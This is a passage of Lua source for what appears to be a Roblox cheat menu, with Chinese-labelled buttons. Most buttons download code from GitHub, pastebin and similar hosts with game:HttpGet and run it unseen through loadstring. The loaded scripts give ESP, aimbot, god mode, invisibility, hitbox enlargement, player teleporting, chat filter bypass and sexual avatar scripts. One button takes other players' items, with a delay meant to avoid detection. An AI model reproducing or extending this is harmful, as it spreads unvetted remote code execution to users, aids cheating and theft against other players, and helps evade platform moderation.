    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "踏空行走",
            Content = execSuccess 
                and "已开启" 
                or "执行失败（语法/角色模型不兼容/重力冲突）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        -- 细化失败原因，便于排查
        local errMsg = getSuccess 
            and "脚本内容为空（链接无效）" 
            or "链接失效/网络错误/访问被拒"
        WindUI:Notify({
            Title = "踏空行走",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "透视\n\n透视眼😱", function()
    local scriptUrl = "https://raw.githubusercontent.com/cool83birdcarfly02six/UNIVERSALESPLTX/main/README.md"
    
    -- 校验核心条件：玩家+角色+相机，避免空值错误
    local LocalPlayer = game.Players.LocalPlayer
    local Camera = workspace.CurrentCamera
    if not LocalPlayer or not LocalPlayer.Character or not Camera then
        WindUI:Notify({
            Title = "透视",
            Content = "加载失败",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 分步捕获请求与执行错误，精准定位问题
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        -- 检测是否为有效脚本（README.md可能是说明文档，非脚本代码）
        if scriptContent:find("loadstring") or scriptContent:find("Instance.new") then
            local execSuccess = pcall(loadstring(scriptContent))
            WindUI:Notify({
                Title = "透视",
                Content = execSuccess 
                    and "已开启" 
                    or "执行失败（语法/防作弊检测",
                Icon = execSuccess and "crown" or "error",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "透视",
                Content = "加载失败",
                Icon = "error",
                Duration = 3
            })
        end
    else
        -- 细化失败原因，便于排查
        local errMsg = getSuccess 
            and "脚本内容为空（链接无效）" 
            or "链接失效/网络错误/访问被拒"
        WindUI:Notify({
            Title = "透视",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "光影\n\n好看", function()
    local scriptUrl = "https://pastefy.app/xXkUxA0P/raw"
    
    -- 校验光照服务可用性，提前规避基础错误
    local Lighting = game:GetService("Lighting")
    if not Lighting then
        WindUI:Notify({
            Title = "光影",
            Content = "加载失败：光照服务未找到",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 分步捕获请求与执行错误，精准反馈
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        -- 清理旧光影特效，避免叠加冲突
        for _, effect in ipairs(Lighting:GetChildren()) do
            if effect:IsA("ColorCorrectionEffect") or effect:IsA("BloomEffect") 
               or effect:IsA("BlurEffect") or effect:IsA("SunRaysEffect") then
                effect:Destroy()
            end
        end
        
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "光影",
            Content = execSuccess 
                and "已开启（唯美画面效果生效✨）" 
                or "执行失败（语法/特效不兼容）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        -- 细化失败原因，便于排查
        local errMsg = getSuccess 
            and "脚本内容为空（链接无效）" 
            or "链接失效/网络错误/访问被拒"
        WindUI:Notify({
            Title = "光影",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "光影2\n\n美", function()
    local scriptUrl = "https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"
    
    -- 校验核心服务是否可用，提前规避基础错误
    local Lighting = game:GetService("Lighting")
    if not Lighting then
        WindUI:Notify({
            Title = "光影2",
            Content = "加载失败：光照服务未找到",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 分步捕获请求与执行错误，精准定位问题
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        -- 执行前先清理旧光影特效，避免冲突
        for _, effect in ipairs(Lighting:GetChildren()) do
            if effect:IsA("ColorCorrectionEffect") or effect:IsA("BloomEffect") or effect:IsA("BlurEffect") then
                effect:Destroy()
            end
        end
        
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "光影2",
            Content = execSuccess 
                and "已开启（画面效果已优化✨）" 
                or "执行失败（语法/特效不兼容）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        -- 细化失败原因，便于排查
        local errMsg = getSuccess 
            and "脚本内容为空（链接无效）" 
            or "链接失效/网络错误/访问被拒"
        WindUI:Notify({
            Title = "光影2",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "无头加kor\n\n不知道", function()
    local scriptUrl = "https://rawscripts.net/raw/Universal-Script-Permanent-Headless-And-korblox-Script-4140"
    
    -- 校验角色是否加载完成，避免空值错误
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Humanoid") then
        WindUI:Notify({
            Title = "无头加kor",
            Content = "加载失败：角色未加载完成",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 分步捕获请求与执行错误，精准反馈
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "无头加kor",
            Content = execSuccess 
                and "已开启（外观效果已应用）" 
                or "执行失败（语法/兼容/角色模型不支持）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        -- 细化失败原因，便于排查
        local errMsg = getSuccess 
            and "脚本内容为空（链接无效）" 
            or "链接失效"
        WindUI:Notify({
            Title = "无头加kor",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "自瞄\n\n自瞄", function()
    local scriptUrl = "https://raw.githubusercontent.com/tfcygvunbind/Apple/main/无"
    
    -- 先校验玩家角色是否加载，避免空值关联错误
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        WindUI:Notify({
            Title = "自瞄",
            Content = "加载失败：角色未加载完成",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 分步捕获HTTP请求和脚本执行错误，精准定位问题
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "自瞄",
            Content = execSuccess 
                and "已开启" 
                or "执行失败",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        -- 细化失败原因，便于排查
        local errMsg = getSuccess 
            and "脚本内容为空（链接无效）" 
            or "链接失效/网络错误/访问被拒"
        WindUI:Notify({
            Title = "自瞄",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "建筑工具\n\n工具", function()
    -- 声明局部变量，避免全局污染
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Backpack then
        WindUI:Notify({
            Title = "建筑工具",
            Content = "加载失败：玩家/背包未找到",
            Icon = "error",
            Duration = 3
        })
        return
    end

    pcall(function()
        -- 锤子（创建）
        local Hammer = Instance.new("HopperBin")
        Hammer.Name = "锤子"
        Hammer.BinType = 4 -- 对应创建工具类型
        Hammer.Parent = LocalPlayer.Backpack

        -- 克隆（复制）
        local Clone = Instance.new("HopperBin")
        Clone.Name = "克隆"
        Clone.BinType = 3 -- 对应复制工具类型
        Clone.Parent = LocalPlayer.Backpack

        -- 抓取（移动）- 修复原代码未设置Parent的问题
        local Grab = Instance.new("HopperBin")
        Grab.Name = "抓取"
        Grab.BinType = 2 -- 对应抓取工具类型
        Grab.Parent = LocalPlayer.Backpack

        -- 工具添加成功反馈
        WindUI:Notify({
            Title = "建筑工具",
            Content = "锤子+克隆+抓取已添加到背包",
            Icon = "crown",
            Duration = 3
        })
    end)

    -- 捕获整体错误，补充失败反馈
    if not pcall(function()
        -- 验证工具是否添加成功
        return LocalPlayer.Backpack:FindFirstChild("锤子") 
            and LocalPlayer.Backpack:FindFirstChild("克隆") 
            and LocalPlayer.Backpack:FindFirstChild("抓取")
    end) then
        WindUI:Notify({
            Title = "建筑工具",
            Content = "加载失败",
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "奖励自己\n\n什么鬼", function()
    local scriptUrl = "https://raw.githubusercontent.com/minecrafttotem/yzhs./main/Fe%20pp%20script%20very%20fun"
    
    -- 分步捕获HTTP请求和脚本执行错误，精准反馈
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        -- 单独捕获执行错误，避免影响整体UI
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "奖励自己",
            Content = execSuccess 
                and "已开启" 
                or "执行失败",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        -- 细化失败原因，便于排查
        local errMsg = getSuccess 
            and "脚本内容为空" 
            or "链接失效/网络错误"
        WindUI:Notify({
            Title = "奖励自己",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

-- 通用1 (Tab1)
Button(Tab1, "工具挂\n\n反正我不知道怎么用", function()
    local scriptUrl = "https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/StandAwekening.lua"
    -- 分步捕获请求与执行错误，明确反馈
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "工具挂",
            Content = execSuccess and "已开启" or "执行失败",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误"
        WindUI:Notify({
            Title = "工具挂",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "电脑键盘\n\n不知道", function()
    local scriptUrl = "https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt"
    -- 保留原true参数（强制HTTPS），增强容错
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl, true)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "电脑键盘",
            Content = execSuccess and "已开启" or "执行失败",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误/HTTPS强制失败"
        WindUI:Notify({
            Title = "电脑键盘",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "忍者键盘\n\n不知道", function()
    local scriptUrl = "https://raw.githubusercontent.com/AFKZxc/ERT.MAIN/main/DMK.lua"
    loadstring(game:HttpGet(scriptUrl))()
    -- 保留原true参数（强制HTTPS），增强容错
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl, true)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "忍者键盘",
            Content = execSuccess and "已开启" or "执行失败",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误/HTTPS强制失败"
        WindUI:Notify({
            Title = "忍者键盘",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "死亡笔记\n\n死神？", function()
    local scriptUrl = "https://raw.githubusercontent.com/dingding123hhh/tt/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0%20(1).txt"
    
    -- 分步捕获HTTP请求和脚本执行错误，精准定位问题
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        -- 单独捕获脚本执行错误，避免影响整体UI
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "死亡笔记",
            Content = execSuccess and "已成功开启" or "执行失败（语法/兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        -- 细化失败原因，便于排查
        local errMsg = getSuccess 
            and "脚本内容为空" 
            or "链接失效/网络错误/访问被拒"
        WindUI:Notify({
            Title = "死亡笔记",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab1, "阿尔宙斯V3.0 Ul\n\n阿尔宙斯V3.0 Ul", function()
    local scriptUrl = "https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"
    -- 分步捕获错误，明确变量作用域
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        -- 单独捕获脚本执行错误，避免崩溃
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "阿尔宙斯V3.0 UI", -- 修复原标题错误（撸鸡r6→正确功能名）
            Content = execSuccess and "已成功开启" or "执行失败（语法/兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        -- 细化失败原因，便于排查
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误"
        WindUI:Notify({
            Title = "阿尔宙斯V3.0 UI", -- 统一标题
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

-- 修复：撸鸡r6（补全语法+链接容错）
Button(Tab1, "撸鸡r6\n\n不知道", function()
    pcall(function()
        -- 双重pcall捕获HttpGet和loadstring异常
        local success, scriptContent = pcall(function()
            return game:HttpGet("https://pastefy.app/wa3v2Vgm/raw")
        end)
        if success and scriptContent then
            loadstring(scriptContent)()
            WindUI:Notify({
                Title = "撸鸡r6",
                Content = "已开启（请遵守平台规则）",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "撸鸡r6",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：撸鸡R15（补全语法+链接容错）
Button(Tab1, "撸鸡R15\n\n不知道", function()
    pcall(function()
        local success, scriptContent = pcall(function()
            return game:HttpGet("https://pastefy.app/YZoglOyJ/raw")
        end)
        if success and scriptContent then
            loadstring(scriptContent)()
            WindUI:Notify({
                Title = "撸鸡R15",
                Content = "已开启（请遵守平台规则）",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "撸鸡R15",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：半隐身（补全语法+链接容错）
Button(Tab1, "半隐身\n\n暗黑马克😱", function()
    pcall(function()
        local success, scriptContent = pcall(function()
            return game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invisible-35376")
        end)
        if success and scriptContent then
            loadstring(scriptContent)()
            WindUI:Notify({
                Title = "半隐身",
                Content = "已开启（请遵守平台规则）",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "半隐身",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：上帝模式（补全语法+链接容错）
Button(Tab1, "上帝模式\n\n一关就死", function()
    pcall(function()
        local success, scriptContent = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main", true)
        end)
        if success and scriptContent then
            loadstring(scriptContent)()
            WindUI:Notify({
                Title = "上帝模式",
                Content = "已开启（请遵守平台规则）",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "上帝模式",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：r15变r6（补全语法+链接容错）
Button(Tab1, "r15变r6\n\n机甲变身，宫锁千钧！", function()
    pcall(function()
        local success, scriptContent = pcall(function()
            return game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-on-R15-16865")
        end)
        if success and scriptContent then
            loadstring(scriptContent)()
            WindUI:Notify({
                Title = "r15变r6",
                Content = "已开启（请遵守平台规则）",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "r15变r6",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：聊天绕过（添加链接容错+结果验证）
Button(Tab1, "聊天绕过\n\n小心封号", function()
    pcall(function()
        local success, result = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/BingusWR/Fechatbypassroblox/refs/heads/main/Fe%20Roblox%20ChatBypass")
        end)
        if success and result then
            loadstring(result)()
            WindUI:Notify({
                Title = "聊天绕过",
                Content = "已开启（请遵守平台规则）",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "聊天绕过",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：聊天框画画脚本（添加链接容错）
Button(Tab1, "聊天框画画脚本\n\n太牛了", function()
    pcall(function()
        local success, result = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/ocfi/_/refs/heads/main/a")
        end)
        if success and result then
            loadstring(result)()
            WindUI:Notify({
                Title = "聊天框画画脚本",
                Content = "已开启",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "聊天框画画脚本",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：偷别人物品栏道具（添加延迟+空值判断+防检测）
Button(Tab1, "偷别人物品栏道具\n\n小偷👍", function()
    pcall(function()
        local localPlayer = game.Players.LocalPlayer
        for _, player in pairs(game.Players:GetChildren()) do
            if player ~= localPlayer and player:IsDescendantOf(game.Players) then
                -- 等待0.2秒，避免瞬时操作被检测
                task.wait(0.2)
                -- 判断玩家角色和背包是否存在
                local backpack = player:FindFirstChild("Backpack")
                if backpack then
                    for _, item in pairs(backpack:GetChildren()) do
                        -- 只偷可拾取物品（过滤核心组件）
                        if item:IsA("Tool") or item:IsA("HopperBin") then
                            item.Parent = localPlayer.Backpack
                        end
                    end
                end
            end
        end
        WindUI:Notify({
            Title = "偷别人物品栏道具",
            Content = "已执行（部分物品可能受保护）",
            Icon = "crown",
            Duration = 3
        })
    end)
end)

-- 修复：超广角设置（定义合理FOV值+边界限制）
Button(Tab1, "超广角设置\n\n超级大广角", function()
    pcall(function()
        local camera = workspace.CurrentCamera
        if camera then
            -- 合理超广角值（正常70，最大120，避免画面畸变）
            local wideFOV = 100
            -- 限制FOV范围（10-120）
            wideFOV = math.clamp(wideFOV, 10, 120)
            camera.FieldOfView = wideFOV
            WindUI:Notify({
                Title = "超广角设置",
                Content = "已开启（FOV: " .. wideFOV .. "）",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "超广角设置",
                Content = "相机未找到",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：自动弹钢琴（添加链接容错）
Button(Tab1, "自动弹钢琴\n\n解放双手", function()
    pcall(function()
        local success, result = pcall(function()
            return game:HttpGet("https://rawscripts.net/raw/Tac's-Piano-Stuff-Talentless-script-made-by-hellohellohell012321-44088")
        end)
        if success and result then
            loadstring(result)()
            WindUI:Notify({
                Title = "自动弹钢琴",
                Content = "已开启",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "自动弹钢琴",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：伪VP（添加链接容错）
Button(Tab1, "伪VP\n\n伪个VP", function()
    pcall(function()
        local success, result = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty45.lua")
        end)
        if success and result then
            loadstring(result)()
            WindUI:Notify({
                Title = "伪VP",
                Content = "已开启",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "伪VP",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：爬墙（语法错误+链接容错）
Button(Tab1, "爬墙\n\n蜘蛛侠😱😱😱", function()
    pcall(function()
        local success, result = pcall(function()
            return game:HttpGet("https://pastebin.com/raw/zXk4Rq2r")
        end)
        if success and result then
            loadstring(result)() -- 修复：去掉多余的括号
            WindUI:Notify({
                Title = "爬墙",
                Content = "已开启",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "爬墙",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：美丽天空（保留核心光照+添加参数优化）
Button(Tab1, "美丽天空\n\n真好看", function()
    pcall(function()
        local light = game.Lighting
        -- 只删除特效类子对象，保留基础光照（避免全黑）
        for _, v in pairs(light:GetChildren()) do
            if v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("SunRaysEffect") or v:IsA("BlurEffect") then
                v:Destroy()
            end
        end
        -- 重新创建优化后的特效
        local color = Instance.new("ColorCorrectionEffect")
        color.Brightness = 0.1
        color.Contrast = 1.2
        color.Saturation = 0.8
        color.Parent = light

        local bloom = Instance.new("BloomEffect")
        bloom.Intensity = 0.5
        bloom.Size = 10
        bloom.Threshold = 0.2
        bloom.Parent = light

        local sun = Instance.new("SunRaysEffect")
        sun.Intensity = 0.3
        sun.Spread = 15
        sun.Parent = light

        local blur = Instance.new("BlurEffect")
        blur.Size = 2
        blur.Parent = light

        WindUI:Notify({
            Title = "美丽天空",
            Content = "已开启（优化光照参数）",
            Icon = "crown",
            Duration = 3
        })
    end)
end)

-- 修复：玩家进入提示（添加链接容错+本地备份逻辑）
Button(Tab1, "玩家进入提示\n\n某某退了，某某进了", function()
    pcall(function()
        local success, result = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/boyscp/scriscriptsc/main/bbn.lua")
        end)
        if success and result then
            loadstring(result)()
            WindUI:Notify({
                Title = "玩家进入提示",
                Content = "已开启",
                Icon = "crown",
                Duration = 3
            })
        else
            -- 本地备份逻辑（基础提示功能）
            local Players = game:GetService("Players")
            Players.PlayerAdded:Connect(function(player)
                WindUI:Notify({
                    Title = "玩家提示",
                    Content = player.Name .. " 进入了服务器",
                    Icon = "crown",
                    Duration = 3
                })
            end)
            Players.PlayerRemoving:Connect(function(player)
                WindUI:Notify({
                    Title = "玩家提示",
                    Content = player.Name .. " 退出了服务器",
                    Icon = "crown",
                    Duration = 3
                })
            end)
            WindUI:Notify({
                Title = "玩家进入提示",
                Content = "已开启（本地备份模式）",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：替身（添加链接容错）
Button(Tab1, "替身\n\n不知道", function()
    pcall(function()
        local success, result = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/SkrillexMe/SkrillexLoader/main/SkrillexLoadMain")
        end)
        if success and result then
            loadstring(result)()
            WindUI:Notify({
                Title = "替身",
                Content = "已开启",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "替身",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：传送位置（添加链接容错）
Button(Tab1, "传送位置\n\n保存位置，就能传送位置", function()
    pcall(function()
        local success, result = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/tfcygvunbind/557/e60a0d8126aac063076ffbd19e0c79c2c82211e5/%EF%BC%81")
        end)
        if success and result then
            loadstring(result)()
            WindUI:Notify({
                Title = "传送位置",
                Content = "已开启",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "传送位置",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

-- 修复：传送玩家（添加链接容错+空值判断）
Button(Tab1, "传送玩家\n\n传送当前的服务器玩家", function()
    pcall(function()
        local success, result = pcall(function()
            return game:HttpGet("https://raw.githubusercontent.com/tfcygvunbind/557/1bd994773a5f2e34c81611a5903c0773c97d2b99/%EF%BC%9F")
        end)
        if success and result then
            loadstring(result)()
            WindUI:Notify({
                Title = "传送玩家",
                Content = "已开启",
                Icon = "crown",
                Duration = 3
            })
        else
            WindUI:Notify({
                Title = "传送玩家",
                Content = "加载失败，链接可能失效",
                Icon = "crown",
                Duration = 3
            })
        end
    end)
end)

Button(Tab1, "反挂机V2\n\n过了20分钟后，不会被踢出去", function()
    pcall(function()
        loadstring(game:HttpGet("https://pastebin.com/raw/9fFu43FF"))()
        WindUI:Notify({
            Title = "反挂机V2",
            Content = "已开启",
            Icon = "crown",
            Duration = 3
        })
    end)
end)

Button(Tab1, "防坠落\n\n安全防护，避免坠落伤害", function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/liuliuqiang404-code/-/refs/heads/main/%E9%98%B2%E5%9D%A0%E8%90%BD2"))()
        WindUI:Notify({
            Title = "防坠落",
            Content = "已开启",
            Icon = "crown",
            Duration = 3
        })
    end)
end)

-- 通用2 (Tab2)
Button(Tab2, "紫沙\n\nQ！", function()
    pcall(function()
        game.Players.LocalPlayer.Character.Humanoid.Health=0
        -- 添加通知（补全所有闭合符号）
        WindUI:Notify({
            Title = "紫沙",
            Content = "已开启",
            Icon = "crown",
            Duration = 3
        })
    end)
end)

Button(Tab2, "修改攻击体积\n\n攻击范围", function()
    pcall(function()
        local ScreenGui = Instance.new("ScreenGui")
        local main = Instance.new("Frame")
        local label = Instance.new("TextLabel")
        local Hitbox = Instance.new("TextButton")

        ScreenGui.Parent = game.CoreGui

        main.Name = "main"
        main.Parent = ScreenGui
        main.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        main.Position = UDim2.new(0.40427351, 0, 0.34591195, 0)
        main.Size = UDim2.new(0, 100, 0, 100)
        main.Active = true
        main.Draggable = true

        label.Name = "label"
        label.Parent = main
        label.BackgroundColor3 = Color3.fromRGB(139,0,0)
        label.Size = UDim2.new(0, 100, 0, 20)
        label.Font = Enum.Font.SourceSans
        label.Text = "Hitbox Gui"
        label.TextColor3 = Color3.fromRGB(0, 0, 0)
        label.TextScaled = true
        label.TextSize = 5.000
        label.TextWrapped = true

        Hitbox.Name = "Hitbox"
        Hitbox.Parent = main
        Hitbox.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
        Hitbox.Position = UDim2.new(0.114285722, 0, 0.372448981, 0)
        Hitbox.Size = UDim2.new(0, 90, 0, 40)
        Hitbox.Font = Enum.Font.SourceSans
        Hitbox.Text = "Hitbox"
        Hitbox.TextColor3 = Color3.fromRGB(0, 0, 0)
        Hitbox.TextSize = 40.000
        Hitbox.MouseButton1Down:connect(function()
            _G.HeadSize = 20
            _G.Disabled = true

            game:GetService('RunService').RenderStepped:connect(function()
                if _G.Disabled then
                    for i,v in next, game:GetService('Players'):GetPlayers() do
                        if v.Name ~= game:GetService('Players').LocalPlayer.Name then
                            pcall(function()
                                v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
                                v.Character.HumanoidRootPart.Transparency = 0.7
                                v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
                                v.Character.HumanoidRootPart.Material = "Neon"
                                v.Character.HumanoidRootPart.CanCollide = false
                            end)
                        end
                    end
                end
            end)
        end)
        -- 添加通知（补全所有闭合符号）
        WindUI:Notify({
            Title = "修改攻击面积",
            Content = "已开启",
            Icon = "crown",
            Duration = 3
        })
    end)
end)

Button(Tab2, "脏话防屏蔽（有封号风险）\n\n有封号风险", function()
    local scriptUrl = "https://the-shed.xyz/roblox/scripts/ChatBypass"
    
    -- 分步捕获错误，强化风险提示
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl, true)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "脏话防屏蔽",
            Content = execSuccess 
                and "已开启（⚠️ 高封号风险！谨慎使用！）" 
                or "执行失败（语法/防作弊检测/链接失效）",
            Icon = execSuccess and "warning" or "error",
            Duration = 4 -- 延长提示时间，强调风险
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误/HTTPS强制失败"
        WindUI:Notify({
            Title = "脏话防屏蔽",
            Content = "加载失败：" .. errMsg .. "（⚠️ 即使加载成功也可能封号）",
            Icon = "error",
            Duration = 4
        })
    end
end)

Button(Tab2, "动作\n\n动作包", function()
    local scriptUrl = "https://pastebin.com/raw/1nJD7PkH"
    
    -- 校验角色人形组件，避免动作加载失败
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Humanoid") then
        WindUI:Notify({
            Title = "动作包",
            Content = "加载失败：角色未加载完成",
            Icon = "error",
            Duration = 3
        })
        return
    end

    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl, true)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "动作包",
            Content = execSuccess 
                and "已开启（动作包加载完成✨）" 
                or "执行失败（语法/角色模型不兼容）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误"
        WindUI:Notify({
            Title = "动作包",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

